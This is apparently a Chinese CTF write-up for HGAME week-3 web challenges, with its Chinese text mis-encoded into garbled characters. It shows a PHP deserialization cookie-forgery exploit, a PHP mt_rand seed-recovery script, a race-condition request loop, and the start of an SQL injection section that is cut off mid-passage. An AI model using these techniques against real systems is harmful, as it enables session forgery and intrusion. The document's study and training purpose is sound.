ä¸ºxssèŠ±äº†å¤ªå¤šæ—¶é—´æ²¡åšå‡ºæ¥è‡ªé—­äº†ä¸æƒ³åšäº†)æ€»è€Œè¨€ä¹‹æ”¶è·ä¸å°ï¼Œä¹Ÿå¤´ä¸€æ¬¡æ„Ÿå—åˆ°é«˜æ‰‹åˆ‡ç£‹çš„æ„æ€ã€‚ä¸‹ä¸ªweekä¼°è®¡ä¸ä¼šå†èŠ±è¿™ä¹ˆå¤šæ—¶é—´åšé¢˜äº†ã€‚å¹²è„†å†™ä¸‹æ¬ ç€çš„ç¬”è®°ä»¥åŠå…¶ä»–äº‹å§ã€‚","text":"week3çš„éš¾åº¦æ›´ä¸Šä¸€å±‚æ¥¼ã€‚æœä¸å…¶ç„¶akæ‰webçš„flagå€’äº†ï¼Œæœ€åè¿˜æ˜¯å·®ä¸€é“é¢˜(å…¶å®æ˜¯å› ä¸ºxssèŠ±äº†å¤ªå¤šæ—¶é—´æ²¡åšå‡ºæ¥è‡ªé—­äº†ä¸æƒ³åšäº†)æ€»è€Œè¨€ä¹‹æ”¶è·ä¸å°ï¼Œä¹Ÿå¤´ä¸€æ¬¡æ„Ÿå—åˆ°é«˜æ‰‹åˆ‡ç£‹çš„æ„æ€ã€‚ä¸‹ä¸ªweekä¼°è®¡ä¸ä¼šå†èŠ±è¿™ä¹ˆå¤šæ—¶é—´åšé¢˜äº†ã€‚å¹²è„†å†™ä¸‹æ¬ ç€çš„ç¬”è®°ä»¥åŠå…¶ä»–äº‹å§ã€‚ åºåˆ—ä¹‹äº‰ - Ordinal Scaleå…¶å®è¿™é“ååºåˆ—åŒ–åº”è¯¥æ˜¯å‡ºç»™è¿™ä¸ªweekçš„ç­¾åˆ°é¢˜ï¼Œå¯æƒœè‡ªå·±å¤ªèœäº†â€¦â€¦ååºåˆ—åŒ–æœç„¶è¿˜æ˜¯è¦å¥½å¥½ç ”ç©¶ä¸€ä¸‹å•Šã€‚å¥½åœ¨æœ€åè¿˜æ˜¯åšå‡ºæ¥äº†ï¼Œè€Œä¸”è¿˜ä½“ä¼šåˆ°ä¸å°‘ååºåˆ—åŒ–çš„è¶£å‘³æ€§ã€‚çœ‹æ¥æ˜¯åº”è¯¥å¥½å¥½ç ”ç©¶ä¸€ç•ªäº†ï¼šé¦–å…ˆæºç æç¤ºsource.zip,æˆ‘ä»¬çœ‹ä¸‹æºç ä¸­æœ‰ç”¨çš„éƒ¨åˆ†ï¼šgame.php(ç•¥æ‰æ— ç”¨éƒ¨åˆ†) 123456789101112131415161718192021&lt;?php error_reporting(0); include_once('cardinal.php'); if(isset($_SESSION['player']))&#123; $playerName = $_SESSION['player']; &#125;else&#123; $playerName = $_POST['player'] ?? ''; if($playerName === '' || is_array($playerName))&#123; header('Location: index.php'); exit; &#125; &#125; $game = new Game($playerName);?&gt;å½“å‰æ’å: &lt;?php echo($game-&gt;rank-&gt;Get());?&gt; ç»éªŒ: &lt;?php echo($_SESSION['exp']);?&gt; &lt;?php echo($game-&gt;welcomeMsg);?&gt; &lt;?php echo($game-&gt;rank-&gt;Get());?&gt; &lt;?php if($game-&gt;rank-&gt;Get() === 1)&#123;?&gt;hgame&#123;flag_is_here&#125; cardinal.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138&lt;?phperror_reporting(0);session_start();class Game&#123; private $encryptKey = 'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW'; public $welcomeMsg = '%s, Welcome to Ordinal Scale!'; private $sign = ''; public $rank; public function __construct($playerName)&#123; $_SESSION['player'] = $playerName; if(!isset($_SESSION['exp']))&#123; $_SESSION['exp'] = 0; &#125; $data = [$playerName, $this-&gt;encryptKey]; $this-&gt;init($data); $this-&gt;monster = new Monster($this-&gt;sign); $this-&gt;rank = new Rank(); &#125; private function init($data)&#123; foreach($data as $key =&gt; $value)&#123; $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value); $this-&gt;sign .= md5($this-&gt;sign . $value); &#125; &#125;&#125;class Rank&#123; private $rank; private $serverKey; // æœåŠ¡å™¨çš„ Key private $key = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'; public function __construct()&#123; if(!isset($_SESSION['rank']))&#123; $this-&gt;Set(rand(2, 1000)); return; &#125; $this-&gt;Set($_SESSION['rank']); &#125; public function Set($no)&#123; $this-&gt;rank = $no; &#125; public function Get()&#123; return $this-&gt;rank; &#125; public function Fight($monster)&#123; if($monster['no'] &gt;= $this-&gt;rank)&#123; $this-&gt;rank -= rand(5, 15); if($this-&gt;rank &lt;= 2)&#123; $this-&gt;rank = 2; &#125; $_SESSION['exp'] += rand(20, 200); return array( 'result' =&gt; true, 'msg' =&gt; '&lt;span style=\"color:green;\"&gt;Congratulations! You win! &lt;/span&gt;' ); &#125;else&#123; return array( 'result' =&gt; false, 'msg' =&gt; '&lt;span style=\"color:red;\"&gt;You die!&lt;/span&gt;' ); &#125; &#125; public function __destruct()&#123; // ç¡®ä¿ç¨‹åºæ˜¯è·‘åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼ $this-&gt;serverKey = $_SERVER['key']; if($this-&gt;key === $this-&gt;serverKey)&#123; $_SESSION['rank'] = $this-&gt;rank; &#125;else&#123; // éæ­£å¸¸è®¿é—® session_start(); session_destroy(); setcookie('monster', ''); header('Location: index.php'); exit; &#125; &#125;&#125;class Monster&#123; private $monsterData; private $encryptKey; public function __construct($key)&#123; $this-&gt;encryptKey = $key; if(!isset($_COOKIE['monster']))&#123; $this-&gt;Set(); return; &#125; $monsterData = base64_decode($_COOKIE['monster']); if(strlen($monsterData) &gt; 32)&#123; $sign = substr($monsterData, -32); $monsterData = substr($monsterData, 0, strlen($monsterData) - 32); if(md5($monsterData . $this-&gt;encryptKey) === $sign)&#123; $this-&gt;monsterData = unserialize($monsterData); &#125;else&#123; session_start(); session_destroy(); setcookie('monster', ''); header('Location: index.php'); exit; &#125; &#125; $this-&gt;Set(); &#125; public function Set()&#123; $monsterName = ['æ— åå°æ€ª', 'BOSS: The Kernal Cosmos', 'å°æ€ª: Big Eggplant', 'BOSS: The Mole King', 'BOSS: Zero Zone Witch']; $this-&gt;monsterData = array( 'name' =&gt; $monsterName[array_rand($monsterName, 1)], 'no' =&gt; rand(1, 2000), ); $this-&gt;Save(); &#125; public function Get()&#123; return $this-&gt;monsterData; &#125; private function Save()&#123; $sign = md5(serialize($this-&gt;monsterData) . $this-&gt;encryptKey); setcookie('monster', base64_encode(serialize($this-&gt;monsterData) . $sign)); &#125;&#125; ä¸‰ä¸ªæ•´é½çš„ç±»ï¼Œæ˜¾ç„¶æ˜¯phpååºåˆ—åŒ–äº†ã€‚é¦–å…ˆæ•´ç†ä¸‹æ€è·¯ï¼Œæˆ‘ä»¬è¾“å…¥åå­—åå¼€å§‹æ¸¸æˆï¼Œè¿™æ—¶åªè¦$game-&gt;rank-&gt;Get() === 1å³å¯æ‹¿åˆ°flagã€‚é‚£ä¹ˆé¦–å…ˆè·Ÿéšä¸‹æµç¨‹å§ã€‚ é‡ç‚¹å…ˆæ”¾åœ¨cardinal.phpä¸Šã€‚è¾“å…¥åå­—åï¼Œä¼šå®ä¾‹åŒ–Gameå¯¹è±¡ï¼Œè€Œåœ¨Gameç±»ä¸­ï¼Œå…ˆåå®ä¾‹åŒ–Monsterç±»ä¸Rankç±»å¯¹è±¡ã€‚å…¶ä¸­monsterç±»çš„å®ä¾‹åŒ–ç”¨åˆ°äº†ä¸€ä¸ªinit()å‡½æ•°ã€‚é‡ç‚¹å…³æ³¨ä¸‹è¿™æ®µä»£ç  123456private function init($data)&#123; foreach($data as $key =&gt; $value)&#123; $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value); $this-&gt;sign .= md5($this-&gt;sign . $value); &#125; &#125; è¿™é‡Œçš„sprintf()å‡½æ•°å¯ä»¥åˆ©ç”¨ã€‚ç”±äºsprintf()ä½œç”¨æ˜¯å°†æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™å…¥å˜é‡ä¸­,ç¬¬ä¸€æ¬¡å¾ªç¯$playernameæœ‰å€¼ï¼Œåˆ™å°†å€¼å†™å…¥%sï¼Œå¾ªç¯ç»“æŸï¼Œå¦‚æœå¾ªç¯çš„æ˜¯%såˆ™è¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚æ‰€ä»¥æ‰€è°“çš„$encryptkeyå¯ä»¥ç›´æ¥å¾—åˆ°ã€‚è¾“å…¥åå­—ä¸º%så³å¯ã€‚è¿™ç‚¹æ˜¯éƒå¸ˆå‚…æåˆ°ï¼Œddctf2019 webç­¾åˆ°ä¸­å‡ºç°è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢ä¸€éƒ¨åˆ†ä¹Ÿè·Ÿé‚£é“é¢˜æœ‰å…³ï¼Œæ‰€ä»¥æˆ‘æ‰èƒ½ç»•è¿‡è¿™ç‚¹ã€‚æ¥ç€æ³¨æ„åˆ°ä¸‹é¢,åœ¨å¾ªç¯è¿‡åï¼Œæˆ‘ä»¬çš„å¾ªç¯ç»“æœ$valueç»è¿‡äº†ä¸€æ¬¡MD5,ç”¨äºmonsterçš„å®ä¾‹åŒ–äº†ã€‚é‚£ä¹ˆè·Ÿè¿›monsterç±»ï¼Œå‘ç°é‡è¦ä»£ç  1234567891011121314$monsterData = base64_decode($_COOKIE['monster']); if(strlen($monsterData) &gt; 32)&#123; $sign = substr($monsterData, -32); $monsterData = substr($monsterData, 0, strlen($monsterData) - 32); if(md5($monsterData . $this-&gt;encryptKey) === $sign)&#123; $this-&gt;monsterData = unserialize($monsterData); &#125;else&#123; session_start(); session_destroy(); setcookie('monster', ''); header('Location: index.php'); exit; &#125; &#125; åŸæ¥monsteræ˜¯ä½œä¸ºcookieè¢«å­˜å‚¨èµ·æ¥çš„ï¼Œä¸”åªè¦æˆ‘ä»¬çš„monstercookieæ»¡è¶³æ¡ä»¶ï¼Œå°±æœ‰ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨ã€‚æ‰€ä»¥å…³æ³¨ä¸‹monosterçš„cookieçš„å­˜å‚¨æ–¹å¼ 1234private function Save()&#123; $sign = md5(serialize($this-&gt;monsterData) . $this-&gt;encryptKey); setcookie('monster', base64_encode(serialize($this-&gt;monsterData) . $sign)); &#125; äº†è§£åˆ°åŠ å¯†æ–¹å¼ï¼Œå°±æ˜ç™½äº†æˆ‘ä»¬çš„ååºåˆ—åŒ–ç”Ÿæ•ˆæ–¹æ³•äº†ï¼šæˆ‘ä»¬è¾“å…¥åå­—åï¼Œä¼ªé€ cookieï¼Œä»è€Œæ‰§è¡Œååºåˆ—åŒ–ä½¿Rankç±»ä¸­çš„$rankä¸º1ï¼Œæ‹¿åˆ°flagã€‚æ‰€ä»¥expå¦‚ä¸‹ï¼Œæ³¨æ„monsterç±»ä¸­çš„$encryptleyä¸æ˜¯Gameç±»ä¸­çš„çš„keyã€‚è€Œæ˜¯ç»è¿‡åå­—foreachååˆmd5äº†ä¸€ä¸‹ï¼Œä¼ è¿›Monsterç±»ä¸­çš„ï¼›å¦å¤–Rankç±»ä¸­çš„_destruct()ä¹Ÿè¦ç»•è¿‡å•Šã€‚æˆ‘ç›´æ¥æŠŠdestructç±»æ‰”æ‰åå¿˜è®°æ”¹_construct()hh 1234567891011121314151617181920212223&lt;?phpclass Rank&#123; private $rank = 1; private $serverKey; private $key; public function __construct() &#123; $this-&gt;key = &amp;$this-&gt;serverKey; &#125;&#125;$Game_encryptKey = 'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL';$Game_data = ['byc_404', $Game_encryptKey];$Monster_encryptKey = '';foreach($Game_data as $key =&gt; $value)&#123; $Monster_encryptKey .= md5($Monster_encryptKey . $value);&#125;$a = new Rank();$sign = md5(serialize($a) . $Monster_encryptKey);$cookie = base64_encode(serialize($a) . $sign);echo $cookie; äºŒå‘å…¥é­‚ï¼æœ‰ä¸€è¯´ä¸€ï¼Œè™½ç„¶è¿™é¢˜ç¬¬11ä¸ªåšå‡ºæ¥æŒºé«˜å…´çš„ï¼Œä½†æ˜¯åŸºæœ¬æ²¡å•¥æ”¶è·ã€‚é¢˜ç›®æè¿°ä¹Ÿä¸æ¸…æ¥šï¼Œæ¼æ´åˆ©ç”¨æœ‰ç‚¹é¸¡è‚‹ï¼Œåšé¢˜æ—¶å®Œå…¨åŒ–èº«è„šæœ¬å°å­ã€‚æ€»è€Œè¨€ä¹‹ä¸çŸ¥é“å‡ºé¢˜äººçš„æ„å›¾æ˜¯å•¥ï¼Œwebé¢˜ä¸è¯¥æ˜¯è¿™ç§ç±»å‹çš„å§ã€‚ é¦–å…ˆåˆ¤æ–­æ¼æ´ç±»å‹ã€‚è¿›å…¥é¡µé¢å‘ç°æŠ½å¡æ•°ä¸cdkeyè¿™ä¸¤ä¸ªæäº¤æ¡†ã€‚æŠ½å¡æ—¶ä¼šå‡ºç°ä¸€å¤§ä¸²éšæœºæ•°ã€‚cdkeyæ²¡è¯´æ˜è¦æäº¤å•¥ã€‚æäº¤æ—¶ä¼šè¯´æ˜å€¼é”™è¯¯æˆ–è€…æ…¢äº2sã€‚æ‰“å¼€æºç å‘ç°æç¤ºphp5ï¼Œå¯ä»¥è”æƒ³åˆ°æ˜¯php5ä¼ªéšæœºæ•°æ¼æ´(å®é™…ä¸Šå„ä¸ªç‰ˆæœ¬çš„phpéƒ½æœ‰è¿™ä¸€æ¼æ´ï¼Œåªä¸è¿‡5ä¸7æœ‰åŒºåˆ«)ã€‚ä¹‹å‰åœ¨GWCTFä¸Šæ›¾ç»ä½œä¸ºwebç­¾åˆ°é¢˜åšè¿‡ï¼Œæ˜¯å…³äºmt_rand()è¿™ä¸€å‡½æ•°çš„ã€‚æ¼æ´å³åœ¨äºéšæœºæ•°é’Ÿå­è®¾å®šæ—¶ï¼Œäº§ç”Ÿçš„éšæœºæ•°åºåˆ—æ˜¯å›ºå®šçš„ã€‚æ•…å¯ä»¥æ ¹æ®éšæœºæ•°åºåˆ—å€’æ¨ç§å­æˆ–è€…æ ¹æ®ç§å­å»æ¨éšæœºæ•°åºåˆ—ã€‚å¸¸å¸¸ç”¨ä»¥ä¸‹ä»£ç æµ‹è¯•ï¼š 1234mt_srand(123);for($i&#x3D;0;$i&lt;3;$i++)&#123; echo mt_rand().&quot; &quot;;&#125; å…·ä½“ç ´è§£æ–¹æ³•ä¸»è¦é å·¥å…·ï¼Œå³php_mt_seedï¼Œä¼°è®°éƒ½ç”¨è¿‡ã€‚å¯ä»¥æ ¹æ®ä¸€ä¸ªæ•°å€’æ¨å‡ºå„ä¸ªphpç‰ˆæœ¬ä¸‹çš„éšæœºæ•°ç§å­ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºé¢˜ç›®çš„ç§å­æ˜¾ç„¶æ˜¯åŠ¨æ€æ›´æ–°çš„ï¼Œä¸”åŸºæœ¬ä¸è¶…è¿‡2sã€‚ç›¸æ¯”GWCTFåªè·Ÿsessionæœ‰å…³çš„é™æ€ç§å­ï¼Œæœ¬é¢˜çš„æ›´æ–°é€Ÿåº¦è¿«ä½¿æˆ‘ä»¬åªèƒ½é è„šæœ¬è§£å†³ã€‚æœæ–­ä¸Šgoogleæ‰¾ç›¸å…³æ–‡ç« ï¼Œè¿™ç¯‡æ–‡ç« å¸å¼•åˆ°æˆ‘çš„æ³¨æ„ï¼šhttps://www.ambionics.io/blog/php-mt-rand-predictionæ–‡ç« çš„å‰¯æ ‡é¢˜è¯´æ˜ï¼Œå¯ä»¥åªé€šè¿‡ä¸¤ä¸ªå€¼ä¸”å¹¶éæš´åŠ›ç ´è§£çš„æ–¹å¼å¾—åˆ°ç§å­ã€‚äºæ˜¯è¯»äº†ä¸‹æ–‡ç« ï¼Œå‘ç°è¯»ä¸æ‡‚ï¼Œçº¯ç®—æ³•å±‚é¢ã€‚å¥½åœ¨ç»™å‡ºäº†è„šæœ¬https://github.com/ambionics/mt_rand-reverseåŠä½¿ç”¨æ–¹æ³•é‡Œé¢ä¸€ä¸ªphpè„šæœ¬ç”¨äºç”Ÿæˆéšæœºæ•°ï¼Œå…¶ä¸­ä¸¤ä¸ªå‚æ•°ä¸€ä¸ªä¸ºç§å­ï¼Œå¦ä¸€ä¸ªä¸ºåç§»é‡ï¼Œå¦‚æœoffsetè®¾ä¸º0ï¼Œåˆ™è¾“å‡ºçš„æ˜¯ä»¥è¾“å…¥ç§å­ç”Ÿæˆçš„ç¬¬1ä¸ªå’Œç¬¬228ä¸ªéšæœºæ•°ï¼›pythonè„šæœ¬ç”¨äºè§£éšæœºæ•°ï¼Œå…±å››ä¸ªå‚æ•°ï¼Œå‰é¢phpè„šæœ¬ç”Ÿæˆçš„ä¸¤ä¸ªéšæœºæ•°ï¼Œä¸€ä¸ªåç§»é‡åŒä¸Šï¼ŒåŠ ä¸Šä¸€ä¸ªå€¼ä¸º0/1çš„ç”¨äºåˆ¤åˆ«phpç‰ˆæœ¬çš„å‚æ•°ã€‚0ä¸ºphp5,1ä¸ºphp7 æ‰€ä»¥æˆ‘å°è¯•æ‹¿æœ¬åœ°çš„ä¸€ç»„æ•°æ®åœ¨è™šæ‹Ÿæœºé‡Œè¯•ä¸‹ï¼Œå‘ç°å¾ˆå¿«èƒ½æ‹¿åˆ°ç»“æœç§å­123ï¼Œ 1python3 reverse_mt_rand.py 644748169 126568735 0 0 å¯èƒ½å°±æ˜¯æˆ‘è¦çš„è„šæœ¬ã€‚æ‰€ä»¥æ€è·¯å¦‚ä¸‹ï¼Œåœ¨è„šæœ¬ä¸­ç»™æŠ½å¡æ¬¡æ•°ä¼ ä¸º228ï¼Œè·å–ç¬¬ä¸€ä¸ªå’Œç¬¬227ä¸ªéšæœºæ•°ï¼Œä¼ ç»™è„šæœ¬ï¼Œå¦ä¸¤ä¸ªå‚æ•°ç›´æ¥è®¾ä¸º0 0æ‰§è¡Œï¼Œç»“æœå¼€å§‹ç¿»è½¦ã€‚ä¸»è¦æ˜¯è‡ªå·±ä¸ç†Ÿæ‚‰osåº“å§ï¼Œæƒ³è¦ç›´æ¥åœ¨ä¸€ä¸ªè„šæœ¬é‡Œè°ƒç”¨å¦ä¸€ä¸ªè„šæœ¬ï¼Œè™½ç„¶ç»“æœæ˜¯å¯¹çš„ä½†å°±æ˜¯æ‹¿ä¸åˆ°flagã€‚äºæ˜¯ç›´æ¥æ”¹è¿™ä¸ªè§£å¯†è„šæœ¬(ä¸»è¦æ˜¯æŠŠmain()æ”¹æˆè¿”å›intå€¼,åŸæœ¬æ˜¯ç›´æ¥printçš„)ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202import randomimport requestsimport reimport timetime_start=time.time()url = 'https://twoshot.hgame.n3ko.co/random.php?times=228'url1 = 'https://twoshot.hgame.n3ko.co/verify.php's = requests.session()res = s.get(url)key = res.textkey = key.replace('[', '')key = key.replace(']', ',')ans = re.findall(r'(.*?)\\,', key)arg1=ans[0]arg2=ans[227]print(arg1)print(arg2)#ä»¥ä¸‹ä¸ºåŸè„šæœ¬N = 624M = 397MAX = 0xffffffffMOD = MAX + 1# STATE_MULT * STATE_MULT_INV = 1 (mod MOD)STATE_MULT = 1812433253STATE_MULT_INV = 2520285293MT_RAND_MT19937 = 1MT_RAND_PHP = 0def php_mt_initialize(seed): \"\"\"Creates the initial state array from a seed. \"\"\" state = [None] * N state[0] = seed &amp; 0xffffffff; for i in range(1, N): r = state[i - 1] state[i] = (STATE_MULT * (r ^ (r &gt;&gt; 30)) + i) &amp; MAX return statedef undo_php_mt_initialize(s, p): \"\"\"From an initial state value `s` at position `p`, find out seed. \"\"\" # We have: # state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000 # and: # (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse) # =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000) for i in range(p, 0, -1): s = _undo_php_mt_initialize(s, i) return sdef _undo_php_mt_initialize(s, i): s = (STATE_MULT_INV * (s - i)) &amp; MAX return s ^ s &gt;&gt; 30def php_mt_rand(s1): \"\"\"Converts a merged state value `s1` into a random value, then sent to the user. \"\"\" s1 ^= (s1 &gt;&gt; 11) s1 ^= (s1 &lt;&lt; 7) &amp; 0x9d2c5680 s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000 s1 ^= (s1 &gt;&gt; 18) return s1def undo_php_mt_rand(s1): \"\"\"Retrieves the merged state value from the value sent to the user. \"\"\" s1 ^= (s1 &gt;&gt; 18) s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000 s1 = undo_lshift_xor_mask(s1, 7, 0x9d2c5680) s1 ^= s1 &gt;&gt; 11 s1 ^= s1 &gt;&gt; 22 return s1def undo_lshift_xor_mask(v, shift, mask): \"\"\"r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask) \"\"\" for i in range(shift, 32, shift): v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i return vdef bits(v, start, size): return lobits(v &gt;&gt; start, size)def lobits(v, b): return v &amp; ((1 &lt;&lt; b) - 1)def bit(v, b): return v &amp; (1 &lt;&lt; b)def bv(v, b): return bit(v, b) &gt;&gt; bdef php_mt_reload(state, flavour): s = state for i in range(0, N - M): s[i] = _twist_php(s[i + M], s[i], s[i + 1], flavour) for i in range(N - M, N - 1): s[i] = _twist_php(s[i + M - N], s[i], s[i + 1], flavour)def _twist_php(m, u, v, flavour): \"\"\"Emulates the `twist` and `twist_php` #defines. \"\"\" mask = 0x9908b0df if (u if flavour == MT_RAND_PHP else v) &amp; 1 else 0 return m ^ (((u &amp; 0x80000000) | (v &amp; 0x7FFFFFFF)) &gt;&gt; 1) ^ maskdef undo_php_mt_reload(S000, S227, offset, flavour): # define twist_php(m,u,v) (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU)) # m S000 # u S227 # v S228 X = S000 ^ S227 # This means the mask was applied, and as such that S227's LSB is 1 s22X_0 = bv(X, 31) # remove mask if present if s22X_0: X ^= 0x9908b0df # Another easy guess s227_31 = bv(X, 30) # remove bit if present if s227_31: X ^= 1 &lt;&lt; 30 # We're missing bit 0 and bit 31 here, so we have to try every possibility s228_1_30 = (X &lt;&lt; 1) for s228_0 in range(2): for s228_31 in range(2): if flavour == MT_RAND_MT19937 and s22X_0 != s228_0: continue s228 = s228_0 | s228_31 &lt;&lt; 31 | s228_1_30 # Check if the results are consistent with the known bits of s227 s227 = _undo_php_mt_initialize(s228, 228 + offset) if flavour == MT_RAND_PHP and bv(s227, 0) != s22X_0: continue if bv(s227, 31) != s227_31: continue # Check if the guessed seed yields S000 as its first scrambled state rand = undo_php_mt_initialize(s228, 228 + offset) state = php_mt_initialize(rand) php_mt_reload(state, flavour) if not (S000 == state[offset]): continue return rand return Nonedef main(_R000, _R227, offset, flavour): # Both were &gt;&gt; 1, so the leftmost byte is unknown _R000 &lt;&lt;= 1 _R227 &lt;&lt;= 1 for R000_0 in range(2): for R227_0 in range(2): R000 = _R000 | R000_0 R227 = _R227 | R227_0 S000 = undo_php_mt_rand(R000) S227 = undo_php_mt_rand(R227) seed = undo_php_mt_reload(S000, S227, offset, flavour) if seed: return seedseed=main(int(arg1), int(arg2), 0, 0)print(seed)data=&#123; 'ans':seed&#125;res1=s.post(url1,data)print(res1.text)time_end=time.time()print('totally cost',time_end-time_start) ä¸ºäº†æ–¹ä¾¿æˆ‘åŠ äº†ä¸ªè®¡æ—¶å™¨è¾“å‡ºè¿è¡Œæ—¶é—´ï¼Œå¯æ˜¯è²Œä¼¼æ—¶é—´çº¦0.3så·¦å³æ—¶ä¹Ÿæ²¡æ‹¿åˆ°flagã€‚å¥½åœ¨è‡ªå·±æ²¡æ”¾å¼ƒä¸€ç›´è¯•ï¼Œåé¢è„šæœ¬è¿è¡Œæ—¶é—´å·®ä¸å¤šä¸€ç›´ä¸º0.18så·¦å³æ—¶æ‹¿åˆ°flagäº†ã€‚å¯èƒ½ä¸€å¼€å§‹è‡ªå·±å†…å­˜è·‘å¤ªæ»¡äº†å§â€¦â€¦ ps:æˆ‘é”™äº†ã€‚åæ¥æ‰å‘ç°è¿™ä¸ªæ´å¾ˆæœ‰ç”¨å¤„ã€‚å› ä¸ºå¾ˆå¤šcmsçš„cookieæ˜¯ç›´æ¥mt_rand()ç”Ÿæˆçš„ã€‚æ‰€ä»¥ä¼ªé€ cookieæ˜¯ä¸€ç§å¦™æ‹› Cosmosçš„äºŒæ‰‹å¸‚åœº æœ‰äº›ä¸¢è„¸ã€‚èƒ½åšå‡ºæ¥æ˜¯é å¸ˆå‚…çš„æç¤ºã€‚ä¹‹å‰æœ€å¤§çš„é—®é¢˜ä¸»è¦åœ¨äºæ²¡æœ‰è¾¨æå‡ºæ¼æ´æ‰€åœ¨ï¼Œå› æ­¤ä¸å¥½ä¸‹æ‰‹ã€‚åƒè¿™ç±»ä¹°å–ä¸œè¥¿çš„é¢˜ç›®ï¼Œæˆ‘è‡ªå·±çš„è®¤è¯†ä¸»è¦æ¥æºäºhackergame2019çš„è¾¾æ‹‰å´©å§å¤§å†’é™©ã€‚å½“æ—¶é‡Œé¢æ¼æ´ä¹‹å¤„åœ¨äºè‡ªå·±çš„æˆ˜æ–—åŠ›å¯ä»¥ä¸ºè´Ÿæ•°ï¼Œæ‰€ä»¥å¼•ç”³å‡ºè´Ÿæº¢å‡ºã€‚è€Œè¿™é“é¢˜å¼€å§‹æˆ‘ä¹Ÿå½“æˆè´Ÿæº¢å‡ºäº†ï¼Œå®é™…ä¸Šæ˜¯ä¸ªå¤šçº¿ç¨‹ï¼Œæˆ–è®¸å«æ¡ä»¶ç«äº‰æ›´ä¸ºå‡†ç¡®ã€‚ ç”¨burpé‡å¤å‘åŒ…å–ä¸œè¥¿ï¼ŒåŒæ—¶è‡ªå·±ç”¨pythonè„šæœ¬ä¸æ–­ä¹°ä¸œè¥¿ã€‚åªè¦burpçš„çº¿ç¨‹æ•°å¿«äºpythonçš„ï¼Œå°±å¯ä»¥ä¿è¯é‡‘é’±æ•°åœ¨å¢åŠ ã€‚pyhtonè„šæœ¬ 1234567891011121314import requestsimport timeurl='http://121.36.88.65:9999//API/?method=buy'cookies=&#123;'PHPSESSID':'d0ov3vsd1hpjjf8ofuakhacd0n'&#125;headers=&#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'&#125;payload=&#123; 'code': '800002', 'amount': '30'&#125;for i in range(1,1000000): res=requests.post(url,data=payload,cookies=cookies,headers=headers) time.sleep(0.6) æ¯”è¾ƒèœï¼Œå¤šçº¿ç¨‹å¿˜å…‰äº†ï¼Œæ‰€ä»¥ç›´æ¥æ¯æ¬¡forå¾ªç¯ç”¨åsleep()ä¸€ä¸‹ã€‚burpç›´æ¥é‡å¤å‘åŒ…ï¼šæœ€åå¤šè·‘å‡ éï¼Œé’±æ•°å¤Ÿäº†åæ‹¿åˆ°flag Cosmosçš„ç•™è¨€æ¿-2æœ‰ç‚¹å‘ã€‚é¢˜ç›®å‘ä¸åœ¨éš¾åº¦ä¸Šï¼Œä¸»è¦æ˜¯ç¯å¢ƒå¤ªå·®äº†ï¼Œä¼°è®¡å‡ ä¸ªäººä¸€èµ·æ³¨å°±è¦å‡ºé—®é¢˜ã€‚å¥½åœ¨è”ç³»å‡ºé¢˜äººé‡å¯äº†ä¸¤éæ€»ç®—èƒ½åšäº†ï¼Œæ¯•ç«Ÿéƒ½æ˜¯ç”¨çš„å­¦ç”Ÿæœºï¼Œèƒ½ç†è§£çš„ã€‚ é¦–å…ˆæ˜¯æ‰¾æ¼æ´ã€‚é¢˜ç›®åç§°æ˜æ˜¾æ˜¯week2ç•™è¨€æ¿çš„åç»­ï¼Œä¹Ÿå°±æ˜¯è¯´å¤šåŠæ˜¯sqlæ³¨å…¥ã€‚å¼€å§‹è¿›å»ä¸€ä¸ªç™»å½•æ¡†ï¼Œæä¾›äº†æ³¨å†ŒåŠŸèƒ½ã€‚æ‰€ä»¥å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ç™»è¿›å»ã€‚æœŸé—´å®¹æ˜“å‘ç°å¯¹ç”¨æˆ·åçš„è¿‡æ»¤å¾ˆä¸¥æ ¼ï¼›è¿›å»åå‘ç°ä¸€ä¸ªç•™è¨€æ¿ã€‚é€šå¸¸ç•™è¨€æ¿å¤šåŠæ˜¯xssæˆ–è€…sqlæ³¨å…¥äº†å§ã€‚äºæ˜¯å°è¯•ç•™å‡ ä¸ªè¨€ã€‚å‘ç°éƒ½ä¸è¡Œã€‚è¿™æ—¶æ³¨æ„åˆ°ä¸€ä¸ªåˆ é™¤åŠŸèƒ½ï¼Œç‚¹å‡»åˆ é™¤åŠŸèƒ½æ—¶å‡ºç°çš„urlæ˜¯è¿™æ ·çš„ï¼š 1index.php?method&#x3D;delete&amp;delete_id&#x3D;1101 å¼€å§‹æˆ‘çš„ç¬¬ä¸€æƒ³æ³•æ˜¯è¿™æ ·çš„ï¼š(å‚è€ƒç½‘ä¸Šæœåˆ°çš„æ–‡ç« 